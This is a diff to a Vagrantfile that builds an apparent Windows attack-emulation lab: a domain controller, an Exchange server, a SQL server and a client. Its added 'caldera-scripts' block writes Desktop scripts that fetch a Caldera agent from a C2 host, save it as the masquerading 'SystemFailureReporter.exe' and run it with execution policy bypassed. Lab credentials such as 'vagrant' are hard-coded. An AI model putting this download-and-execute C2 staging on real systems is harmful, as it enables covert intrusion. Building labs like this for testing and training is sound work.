@@ -1,95 +1,210 @@
 Vagrant.configure("2") do |config|
 
-# -------------------------------------------------------------
-# 1. PLUGIN CHECK AND INSTALLATION (vbguest and reload)
-# -------------------------------------------------------------
-  config.vagrant.plugins = ["vagrant-vbguest", "vagrant-reload"]
+  # =================================================================
+  # PLUGIN CHECK AND INSTALLATION (vbguest and reload)
+  # =================================================================
+  config.vagrant.plugins = ["vagrant-vbguest", "vagrant-reload", "vagrant-vmware-desktop"]
+  #config.vagrant.plugins = ["vagrant-reload", "vagrant-vmware-desktop"]
 
   config.vm.box = "windows-server-2019"
   config.vm.guest = :windows
   config.vm.communicator = "winrm"
-  config.vm.boot_timeout = 600
-  config.vm.graceful_halt_timeout = 600
+  config.vm.boot_timeout = 3600
+  config.vm.graceful_halt_timeout = 3600
   
   config.winrm.transport = :plaintext
   config.winrm.basic_auth_only = true
   
   config.winrm.username = "vagrant"
   config.winrm.password = "vagrant"
-  config.winrm.timeout = 1800
-  config.winrm.retry_limit = 30
+  config.winrm.timeout = 3600
+  config.winrm.retry_limit = 60
   config.winrm.retry_delay = 10
   
-  #config.vm.synced_folder ".", "/vagrant", disabled: true
-  config.vm.synced_folder ".", "/vagrant"
-  config.vbguest.auto_update = true  
-  
-  
-  
-  # -------------------------------------------------------------
-  # Domain Controller - diskjockey
-  # -------------------------------------------------------------
-  
-  
+  config.vm.synced_folder ".", "/vagrant", disabled: true
+  config.vbguest.auto_update = true
+  #config.vbguest.auto_update = false
+    
+
+  # =================================================================
+  # DOMAIN CONTROLLER - diskjockey
+  # =================================================================
   config.vm.define "diskjockey" do |dc|
-    dc.vm.hostname = "diskjockey"    
-    dc.vm.network "private_network",  
-      ip: "10.1.0.4",
-      netmask: "255.255.255.0",
-      virtualbox__intnet: "intnet-target",
-      #auto_config: true # We set the second NIC in the provision-dc.ps1
-      auto_config: false
-      
-    dc.vm.provider "virtualbox" do |vb|
+    dc.vm.hostname = "diskjockey"
+       
+    # =====================================================================
+    # VIRTUALBOX PROVIDER
+    # =====================================================================
+    dc.vm.provider "virtualbox" do |vb, override|
       vb.name = "diskjockey"
       vb.memory = 2048
+      vb.cpus = 1
+      vb.linked_clone = false
+      vb.customize ["modifyvm", :id, "--vram", "128"]
+      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
+      vb.customize ["modifyvm", :id, "--audio", "none"]
+
+      # Override network configuration only for VirtualBox creating a private network
+
+      override.vm.network "private_network",
+        virtualbox__intnet: "intnet-target",
+        adapter: "2",
+        auto_config: false
+
+    end
+    
+    # =====================================================================
+    # VMWARE PROVIDER
+    # =====================================================================
+    dc.vm.provider "vmware_desktop" do |v|
+      v.vmx["displayName"] = "diskjockey"
+      v.memory = 2048
+      v.cpus = 1
+      v.gui = true
+      v.allowlist_verified = true
+      
+      v.force_vmware_license = "workstation"
+      
+      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
+
+      # Network configuration for VMware
+      v.vmx["ethernet0.virtualDev"] = "e1000"
+      v.vmx["ethernet0.connectionType"] = "nat"
+      v.vmx["ethernet0.present"] = "TRUE"
+      v.vmx["ethernet0.pciSlotNumber"] = "33"
+      #v.vmx["ethernet0.addressType"] = "generated"
+      v.vmx["ethernet1.present"] = "TRUE"
+      v.vmx["ethernet1.connectionType"] = "pvn"
+      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
+      v.vmx["ethernet1.virtualDev"] = "e1000"
+      v.vmx["ethernet1.addressType"] = "generated"
+    end
+    
+    # =====================================================================
+    # PROVISIONING
+    # =====================================================================      
+        
+    dc.vm.provision "provision-dc", type: "shell", path: "scripts/provision-dc.ps1", privileged: true
+    dc.vm.provision "reload"
+    dc.vm.provision "creation-users", type: "shell", path: "scripts/creation-users.ps1", privileged: true
+    
+    dc.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # We set the time zone, change accordingly
+      
+     tzutil /s "Romance Standard Time"
+             
+    POWERSHELL
+
+    dc.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # Configure second network adapter since first one is the Vagrant one
+     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
+     # Including naming network interfaces convention from Virtualbox or Vmware respectively
+     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
+     if ($adapter) {
+        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
+        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
+    
+    }     
+             
+    POWERSHELL
+
+    dc.vm.provision "reload"
+
+
+    
+  end
+  
+  # =================================================================
+  # EXCHANGE SERVER - waterfalls
+  # =================================================================
+  config.vm.define "waterfalls" do |exch|
+    exch.vm.hostname = "waterfalls"
+    
+    # =====================================================================
+    # VIRTUALBOX PROVIDER
+    # =====================================================================
+    exch.vm.provider "virtualbox" do |vb, override|
+      vb.name = "waterfalls"
+      vb.memory = 10240
       vb.cpus = 2
       vb.linked_clone = false
       vb.customize ["modifyvm", :id, "--vram", "128"]
       vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
       vb.customize ["modifyvm", :id, "--audio", "none"]
-    end       
-    
-    dc.vm.provision "shell", path: "scripts/provision-dc.ps1", privileged: true
-    
-    dc.vm.provision "reload"
-    
-    dc.vm.provision "shell", path: "scripts/creation-users.ps1", privileged: true
-       
-  end
-  
-  # ------------------------------------------------------------- 
-  # Exchange Server - waterfalls
-  # -------------------------------------------------------------
-  
-  config.vm.define "waterfalls" do |exch|
-    exch.vm.hostname = "waterfalls"
-    exch.vm.network "private_network", 
-      ip: "10.1.0.6",
-      netmask: "255.255.255.0",
+      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "0", "--type", "dvddrive", "--medium", "isos/ExchangeServer2019-x64-CU11.ISO"]
+      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "1", "--type", "dvddrive", "--medium", "isos/SQLServer2019-x64-ENU.iso"]
+
+      override.vm.network "private_network",
       virtualbox__intnet: "intnet-target",
+      adapter: "2",
       auto_config: false
-    #exch.winrm.username = "Administrator"
-    #exch.winrm.password = "vagrant"
-    
-    
-    exch.vm.provider "virtualbox" do |vb|
-      vb.name = "waterfalls"
-      vb.memory = 8192
-      vb.cpus = 4
-      vb.linked_clone = false
-      vb.customize ["modifyvm", :id, "--vram", "128"]
-      vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
-      vb.customize ["modifyvm", :id, "--audio", "none"]
-      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "0", "--device", "0", "--type", "dvddrive", "--medium", "isos/ExchangeServer2019-x64-CU11.iso"]
-      vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "0", "--device", "1", "--type", "dvddrive", "--medium", "isos/SQLServer2019-x64-ENU.iso"]
     end
     
-    exch.vm.provision "shell", path: "scripts/provision-waterfalls-join-domain.ps1", privileged: true
+    # =====================================================================
+    # VMWARE PROVIDER
+    # =====================================================================
+    exch.vm.provider "vmware_desktop" do |v|
+      v.vmx["displayName"] = "waterfalls"
+      v.memory = 10240
+      v.cpus = 2
+      v.gui = true
+      v.allowlist_verified = true
+
+      v.force_vmware_license = "workstation"
+      
+      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
+      
+      # Network configuration for VMware
+      v.vmx["ethernet0.virtualDev"] = "e1000"
+      v.vmx["ethernet0.connectionType"] = "nat"
+      v.vmx["ethernet0.present"] = "TRUE"
+      v.vmx["ethernet0.pciSlotNumber"] = "33"
+      v.vmx["ethernet0.addressType"] = "generated"
+      v.vmx["ethernet1.present"] = "TRUE"
+      v.vmx["ethernet1.connectionType"] = "pvn"
+      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
+      v.vmx["ethernet1.virtualDev"] = "e1000"
+      v.vmx["ethernet1.addressType"] = "generated"
+
+      # Dynamically get the absolute path relative to this Vagrantfile
+      iso_exchange_path = File.expand_path("isos/ExchangeServer2019-x64-CU11.iso", __dir__)
+    
+      # Convert forward slashes into backslashes in case you use Windows
+      #iso_exchange_path = iso_exchange_path.gsub('/', '\\')      
+
+
+      # Dynamically get the absolute path relative to this Vagrantfile
+      iso_sql_path = File.expand_path("isos/SQLServer2019-x64-ENU.iso", __dir__)
+    
+      # Convert forward slashes into backslashes in case you use Windows
+      #iso_sql_path = iso_sql_path.gsub('/', '\\')
+
+
+      # ISO mounting for Exchange Server
+      v.vmx["ide0:0.present"] = "TRUE"
+      v.vmx["ide0:0.fileName"] = iso_exchange_path
+      v.vmx["ide0:0.deviceType"] = "cdrom-image"
+      v.vmx["ide0:0.startConnected"] = "TRUE"
+  
+           
+      # ISO mounting for SQL Server
+      v.vmx["ide0:1.present"] = "TRUE"
+      v.vmx["ide0:1.fileName"] = iso_sql_path
+      v.vmx["ide0:1.deviceType"] = "cdrom-image"
+      v.vmx["ide0:1.startConnected"] = "TRUE"
+    end
+    
+    # =====================================================================
+    # PROVISIONING
+    # =====================================================================
+
+    exch.vm.provision "join-domain", type: "shell", path: "scripts/provision-waterfalls-join-domain.ps1", privileged: true
     
     exch.vm.provision "reload"
     
-    exch.vm.provision "shell", path: "scripts/provision-waterfalls-prerequisites-exchange.ps1", privileged: true
+    exch.vm.provision "prerequisites-exchange", type: "shell", path: "scripts/provision-waterfalls-prerequisites-exchange.ps1", privileged: true
     
     exch.vm.provision "sql-install", type: "shell", path: "scripts/provision-waterfalls-sql.ps1", privileged: true
     
@@ -108,6 +223,8 @@ Vagrant.configure("2") do |config|
       $Domain = "boombox.com"
       $User = "Administrator@boombox.com"
       $Password = "vagrant"
+      
+      Write-Host "Setting up Default credentials for installing Exchange after reboot..." -ForegroundColor Cyan
              
       Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoAdminLogon -Value "1" 
       Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName -Value "$User" 
@@ -150,34 +267,144 @@ Vagrant.configure("2") do |config|
       # We wait until the Exchange installation might have finished at least 2 hours (30 minutes first Start-Sleep + 150 minutes second Start-Sleep )
       Start-Sleep -s 5400 
        
-    POWERSHELL   
-  
+    POWERSHELL
+    
+    exch.vm.provision "create-mailboxes", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+      
+     $DomainServer = "diskjockey.boombox.com" 
+     $ExchangeServer = "waterfalls"
+     $DomainAdmin = "BOOMBOX\Administrator"
+     $DomainPassword = "vagrant"
+     
+     # We set the time zone, change accordingly
+      
+     Write-Host "Enabling gosta mailbox..." -ForegroundColor Cyan
+
+     # Convert the plain text password to a SecureString object
+     $secpasswd = ConvertTo-SecureString $DomainPassword -AsPlainText -Force
+
+     # Create a PSCredential object
+     $cred = New-Object System.Management.Automation.PSCredential($DomainAdmin, $secpasswd)
+
+     # Define the Exchange server connection URI
+
+     $SessionUri = "http://$ExchangeServer/powershell" 
+
+     # Create a new PSSession with the specified credentials and configuration
+     $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $SessionUri -Credential $cred -Authentication Kerberos 
+
+     # Import the cmdlets from the remote session into your local PowerShell session
+     Import-PSSession $Session -DisableNameChecking
+
+     # We Enable-Mailbox for gosta user
+
+     Enable-Mailbox -Identity "gosta@boombox.com" -domainController $DomainServer
+     
+     Test-MapiConnectivity -Identity "gosta@boombox.com"
+     
+     # We close the session
+     Remove-PSSession $Session
+             
+    POWERSHELL
+    
+    exch.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # We set the time zone, change accordingly
+      
+     tzutil /s "Romance Standard Time"
+             
+    POWERSHELL
+
+    exch.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # Configure second network adapter since first one is the Vagrant one
+     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
+     # Including naming network interfaces convention from Virtualbox or Vmware respectively
+     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
+     if ($adapter) {
+        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
+        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
+    
+    }     
+             
+    POWERSHELL
+
+    exch.vm.provision "reload"
+    
+
+
   end
 
-  # ------------------------------------------------------------- 
-  # SQL Server - endofroad
-  # ------------------------------------------------------------- 
-
+  # =================================================================
+  # SQL SERVER - endofroad
+  # =================================================================
   config.vm.define "endofroad" do |sql|
     sql.vm.hostname = "endofroad"
-    sql.vm.network "private_network", 
-      ip: "10.1.0.7",
-      netmask: "255.255.255.0",
-      virtualbox__intnet: "intnet-target",
-      auto_config: false
     
-    sql.vm.provider "virtualbox" do |vb|
+    
+    # =====================================================================
+    # VIRTUALBOX PROVIDER
+    # =====================================================================
+    sql.vm.provider "virtualbox" do |vb, override|
       vb.name = "endofroad"
       vb.memory = 4096
-      vb.cpus = 2
+      vb.cpus = 1
       vb.linked_clone = false
       vb.customize ["modifyvm", :id, "--vram", "128"]
       vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
       vb.customize ["modifyvm", :id, "--audio", "none"]
       vb.customize ["storageattach", :id, "--storagectl", "IDE Controller", "--port", "1", "--device", "0", "--type", "dvddrive", "--medium", "isos/SQLServer2019-x64-ENU.iso"]
+
+      # Override network configuration only for VirtualBox creating a private network
+      override.vm.network "private_network",
+        virtualbox__intnet: "intnet-target",
+        adapter: "2",
+        auto_config: false
     end
-             
-    sql.vm.provision "shell", path: "scripts/provision-endofroad-join-domain.ps1", privileged: true
+    
+    # =====================================================================
+    # VMWARE PROVIDER
+    # =====================================================================
+    sql.vm.provider "vmware_desktop" do |v|
+      v.vmx["displayName"] = "endofroad"
+      v.memory = 4096
+      v.cpus = 1
+      v.gui = true
+      v.allowlist_verified = true
+
+      v.force_vmware_license = "workstation"
+      
+      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
+      
+      # Network configuration for VMware
+      v.vmx["ethernet0.virtualDev"] = "e1000"
+      v.vmx["ethernet0.connectionType"] = "nat"
+      v.vmx["ethernet0.present"] = "TRUE"
+      v.vmx["ethernet0.pciSlotNumber"] = "33"
+      v.vmx["ethernet0.addressType"] = "generated"
+      v.vmx["ethernet1.present"] = "TRUE"
+      v.vmx["ethernet1.connectionType"] = "pvn"
+      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
+      v.vmx["ethernet1.virtualDev"] = "e1000"
+      v.vmx["ethernet1.addressType"] = "generated"
+
+      # Dynamically get the absolute path relative to this Vagrantfile
+      iso_sql_path = File.expand_path("isos/SQLServer2019-x64-ENU.iso", __dir__)
+    
+      # Convert forward slashes into backslashes in case you use Windows
+      #iso_sql_path = iso_sql_path.gsub('/', '\\')
+
+      v.vmx["ide0:0.present"] = "TRUE"
+      v.vmx["ide0:0.fileName"] = iso_sql_path
+      v.vmx["ide0:0.deviceType"] = "cdrom-image"
+      v.vmx["ide0:0.startConnected"] = "TRUE"
+    end
+    
+    # =====================================================================
+    # PROVISIONING
+    # =====================================================================
+     
+    sql.vm.provision "provision-join", type: "shell", path: "scripts/provision-endofroad-join-domain.ps1", privileged: true
     
     sql.vm.provision "reload"
     
@@ -192,6 +419,7 @@ Vagrant.configure("2") do |config|
     sql.vm.provision "file", source: "minfac.csv", destination: "C:\\tmp\\minfac.csv"
     
     sql.vm.provision "provision-db", type: "shell", path: "scripts/provision-db-endofroad-sql.ps1", privileged: true 
+
     sql.vm.provision "file", source: "guest.bmp", destination: "C:\\tmp\\guest.bmp"
     
     sql.vm.provision "create-guest-bmp", type: "shell", privileged: "true", inline: <<-'POWERSHELL'
@@ -221,24 +449,48 @@ Vagrant.configure("2") do |config|
     	}      
 
     POWERSHELL
+
+    sql.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # Configure second network adapter since first one is the Vagrant one
+     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
+     # Including naming network interfaces convention from Virtualbox or Vmware respectively
+     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
+     if ($adapter) {
+        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
+        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
+    
+    }     
+             
+    POWERSHELL
+
+    sql.vm.provision "reload"
+    
+    sql.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # We set the time zone, change accordingly
+      
+     tzutil /s "Romance Standard Time"
+             
+    POWERSHELL
+
     
   end
   
-  # -------------------------------------------------------------
-  # Windows 10 LTSC Client Definition
-  # -------------------------------------------------------------
+  # =================================================================
+  # WINDOWS 10 LTSC CLIENT - theblock
+  # =================================================================
   config.vm.define "theblock" do |client|
-    # NOTE: Use the box name created by the windows-10-ltsc-17763.pkr.hcl build
-    client.vm.box = "windows-10-ltsc-17763" 
+    client.vm.box = "windows-10-ltsc-17763"
     client.vm.hostname = "theblock"
-      
-    client.vm.network "private_network",  
-      ip: "10.1.0.5", # Static IP for the client
-      netmask: "255.255.255.0",
-      virtualbox__intnet: "intnet-target",
-      auto_config: false      
+    client.vm.guest = :windows
+    #client.vbguest.auto_update = true
+    
 
-    client.vm.provider "virtualbox" do |vb|
+    # =====================================================================
+    # VIRTUALBOX PROVIDER
+    # =====================================================================
+    client.vm.provider "virtualbox" do |vb, override|
       vb.name = "theblock"
       vb.memory = 4096
       vb.cpus = 2
@@ -246,9 +498,45 @@ Vagrant.configure("2") do |config|
       vb.customize ["modifyvm", :id, "--vram", "128"]
       vb.customize ["modifyvm", :id, "--clipboard", "bidirectional"]
       vb.customize ["modifyvm", :id, "--audio", "none"]
+
+      override.vm.network "private_network",
+        virtualbox__intnet: "intnet-target",
+        adapter: "2",
+        auto_config: false
     end
     
-    client.vm.provision "shell", path: "scripts/provision-theblock-join-domain.ps1", privileged: true
+    # =====================================================================
+    # VMWARE PROVIDER
+    # =====================================================================
+    client.vm.provider "vmware_desktop" do |v|
+      v.vmx["displayName"] = "theblock"
+      v.memory = 4096
+      v.cpus = 2
+      v.gui = true
+      v.allowlist_verified = true
+
+      v.force_vmware_license = "workstation"
+      
+      v.vmx["isolation.tools.guestDhcp.enabled"] = "TRUE"
+      
+      # Network configuration for VMware
+      v.vmx["ethernet0.virtualDev"] = "e1000"
+      v.vmx["ethernet0.connectionType"] = "nat"
+      v.vmx["ethernet0.present"] = "TRUE"
+      v.vmx["ethernet0.pciSlotNumber"] = "33"
+      v.vmx["ethernet0.addressType"] = "generated"
+      v.vmx["ethernet1.present"] = "TRUE"
+      v.vmx["ethernet1.connectionType"] = "pvn"
+      v.vmx["ethernet1.pvnID"] = "52 3d 44 e8 0e 9a 0b ca-29 7a 57 3c 4f 95 14 89" # Place your ID here in the preferences.ini file or vmx
+      v.vmx["ethernet1.virtualDev"] = "e1000"
+      v.vmx["ethernet1.addressType"] = "generated"
+    end
+    
+    # =====================================================================
+    # PROVISIONING
+    # =====================================================================
+ 
+    client.vm.provision "join-domain", type: "shell", path: "scripts/provision-theblock-join-domain.ps1", privileged: true
     
     client.vm.provision "reload"
 
@@ -326,21 +614,94 @@ Vagrant.configure("2") do |config|
     POWERSHELL
     
     client.vm.provision "provision-theblock", type: "shell", path: "scripts/provision-theblock-provision.ps1", privileged: true
+
+    client.vm.provision "caldera-scripts", type: "shell", inline: <<-'POWERSHELL'
+    $TargetFile1 = "C:\Users\Default\Desktop\caldera\download_agent.ps1"
+	    
+    $ScriptContent1 = @'
+    $server = "http://192.168.0.4:8888" # Adjusted to your lab network IP layout (change if C2 is elsewhere)
+    $url = "$server/file/download"
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.add("platform","windows")
+    $wc.Headers.add("file","sandcat.go")
+    $data = $wc.DownloadData($url)
+
+    # Kill the masqueraded process if it's already running from a previous test execution
+    Get-Process | Where-Object { $_.Modules.FileName -like "C:\Users\Public\SystemFailureReporter.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue
+
+    Remove-Item -Force "C:\Users\Public\SystemFailureReporter.exe" -ErrorAction Ignore
+    [System.IO.File]::WriteAllBytes("C:\Users\Public\SystemFailureReporter.exe", $data)
+'@
+
+    $TargetFile2 = "C:\Users\Default\Desktop\caldera\start_agent.ps1"
+	    
+    $ScriptContent2 = @'
+    $server = "http://192.168.0.4:8888" # Adjusted to your lab network IP layout (change if C2 is elsewhere)
+    $url = "$server/file/download"
+    Start-Process -FilePath C:\Users\Public\SystemFailureReporter.exe -ArgumentList "-server $server -group gosta -v";
+'@
+   $TargetFile3 = "C:\Users\Default\Desktop\caldera\start_agent.bat"
+	    
+    $ScriptContent3 = @'
+    @echo off
+    if not exist "%UserProfile%\AppData\Local\SystemFailureReporter" mkdir %UserProfile%\AppData\Local\SystemFailureReporter
+    cd  %UserProfile%\AppData\Local\SystemFailureReporter
+    powershell -executionpolicy Bypass %UserProfile%\Desktop\caldera\download_agent.ps1
+    powershell -executionpolicy Bypass %UserProfile%\Desktop\caldera\start_agent.ps1
+'@
+
+    # Create directory path if the user profile hasn't fully initialized yet
+    $TargetDir = Split-Path $TargetFile1
+    if (!(Test-Path $TargetDir)) {
+		New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
+    }
+
+
+    Set-Content -Path $TargetFile1 -Value $ScriptContent1 -Force
+    Write-Host "Successfully created download_agent.ps1 on the Desktop." -ForegroundColor Green
+ 
+    Set-Content -Path $TargetFile2 -Value $ScriptContent2 -Force
+    Write-Host "Successfully created start_agent.ps1 on the Desktop." -ForegroundColor Green
     
+    Set-Content -Path $TargetFile3 -Value $ScriptContent3 -Force
+    Write-Host "Successfully created start_agent.bat on the Desktop." -ForegroundColor Green
+    POWERSHELL
+    
+    client.vm.provision "time-zone", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # We set the time zone, change accordingly
+      
+     tzutil /s "Romance Standard Time"
+             
+    POWERSHELL
+
+    client.vm.provision "set-gateway", type: "shell", privileged: "true", inline: <<-'POWERSHELL'    
+     
+     # Configure second network adapter since first one is the Vagrant one
+     Write-Host "Configuring default Gateway..." -ForegroundColor Cyan
+     # Including naming network interfaces convention from Virtualbox or Vmware respectively
+     $adapter = Get-NetAdapter | Where-Object {$_.Name -eq "Ethernet 2" -or $_.Name -eq "Ethernet1" }  
+     if ($adapter) {
+        Write-Host "Network adapter found: $($adapter.Name)" -ForegroundColor Green
+        New-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceIndex $adapter.ifIndex -NextHop "10.1.0.1" -Confirm:$false
+    
+    }     
+             
+    POWERSHELL
+
+    client.vm.provision "remove-autologon", type: "shell", privileged: "true", inline: <<-'POWERSHELL'       
+      
+      # We disable autologon 
+      
+      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name AutoAdminLogon -Value "0"   
+      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultUserName -Value "" 
+      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefaultPassword -Value ""
+      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name DefautDomainName -value ""             
+       
+    POWERSHELL
+
     client.vm.provision "reload"
     
   end
   
-  
-  
 end
-
-
-
-
-
-
-
-
-
-
